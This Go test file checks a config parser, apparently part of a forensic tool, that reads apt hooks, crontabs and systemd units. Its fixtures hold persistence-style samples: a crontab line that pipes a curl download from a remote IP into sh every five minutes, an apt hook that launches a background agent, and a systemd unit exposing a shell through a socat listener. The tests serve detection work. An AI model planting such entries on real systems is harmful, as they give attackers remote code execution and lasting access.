package config

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/ciruzz00/astro/internal/logs"
)

var mtime = time.Date(2026, 10, 11, 21, 0, 0, 0, time.UTC)

func parse(t *testing.T, p, in string) ([]*logs.Event, logs.Stats) {
	t.Helper()
	var evs []*logs.Event
	st, err := New().Parse(context.Background(), strings.NewReader(in), logs.Options{Path: p, Source: p[strings.LastIndex(p, "/")+1:], ModTime: mtime},
		func(e *logs.Event) error { evs = append(evs, e); return nil })
	if err != nil {
		t.Fatal(err)
	}
	return evs, st
}

func TestDetect(t *testing.T) {
	for p, want := range map[string]logs.Kind{
		"/c/[root]/etc/apt/apt.conf.d/99hook":         logs.KindConfig,
		"/etc/crontab":                                logs.KindConfig,
		"/var/spool/cron/crontabs/alice":              logs.KindConfig,
		"/etc/systemd/system/backup.service":          logs.KindConfig,
		"/home/alice/.config/systemd/user/sync.timer": logs.KindConfig,
		"/etc/hosts": logs.KindUnknown,
	} {
		if k := logs.Detect(p, []byte("# text\n")); k != want {
			t.Errorf("Detect(%s) = %s, want %s", p, k, want)
		}
	}
}

func TestAptHooks(t *testing.T) {
	in := `// Stock hook
APT::Update::Post-Invoke-Success {"touch /var/lib/apt/periodic/refresh-stamp 2>/dev/null || true";};
# DPkg::Post-Invoke { "commented out"; };
/* DPkg::Pre-Invoke { "also commented"; }; */
DPkg::Post-Invoke {

    "bash -c 'nohup /usr/local/bin/agent > /dev/null 2>&1 &'";
    "echo \"quoted\"";
};
`
	evs, _ := parse(t, "/etc/apt/apt.conf.d/99hook", in)
	if len(evs) != 3 {
		t.Fatalf("%d hooks: %+v", len(evs), evs)
	}
	if e := evs[1]; e.Kind != KindAptHook || e.Fields["hook"] != "DPkg::Post-Invoke" ||
		e.CommandLine != "bash -c 'nohup /usr/local/bin/agent > /dev/null 2>&1 &'" || e.Ref.Record != "line 7" || !e.Time.Equal(mtime) {
		t.Errorf("hook = %+v", e)
	}
	if evs[2].CommandLine != `echo "quoted"` {
		t.Errorf("escaped quotes = %q", evs[2].CommandLine)
	}
}

func TestCrontabs(t *testing.T) {
	sys := "SHELL=/bin/sh\n# m h dom mon dow user command\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n@reboot alice /home/alice/.x/run\nbroken line\n"
	evs, st := parse(t, "/etc/crontab", sys)
	if len(evs) != 2 || st.Errors != 1 {
		t.Fatalf("%d entries, %d errors", len(evs), st.Errors)
	}
	if e := evs[1]; e.User != "alice" || e.CommandLine != "/home/alice/.x/run" || e.Fields["schedule"] != "@reboot" {
		t.Errorf("system crontab = %+v", e)
	}
	evs, _ = parse(t, "/var/spool/cron/crontabs/bob", "*/5 * * * * curl -s http://198.51.100.7/x | sh\n")
	if len(evs) != 1 || evs[0].User != "" || evs[0].CommandLine != "curl -s http://198.51.100.7/x | sh" {
		t.Errorf("user crontab = %+v", evs)
	}
}

func TestSystemdUnits(t *testing.T) {
	in := "[Unit]\nDescription=Legacy remote shell\n[Service]\nExecStartPre=-/bin/mkdir -p /run/x\nExecStart=/usr/bin/socat TCP-LISTEN:2323,fork EXEC:/opt/legacy/telnetd\nRestart=always\n"
	evs, _ := parse(t, "/etc/systemd/system/legacy.service", in)
	if len(evs) != 2 || evs[0].CommandLine != "/bin/mkdir -p /run/x" || evs[1].Fields["directive"] != "ExecStart" || evs[1].Fields["file"] != "legacy.service" {
		t.Errorf("unit = %+v", evs)
	}
}

func FuzzParse(f *testing.F) {
	f.Add("/etc/apt/apt.conf.d/x", `DPkg::Post-Invoke { "a"; };`)
	f.Add("/etc/crontab", "* * * * * root id\n")
	f.Add("/etc/systemd/system/a.service", "ExecStart=/bin/true\n")
	f.Fuzz(func(t *testing.T, p, in string) {
		_, _ = New().Parse(context.Background(), strings.NewReader(in), logs.Options{Path: p}, func(*logs.Event) error { return nil })
	})
}
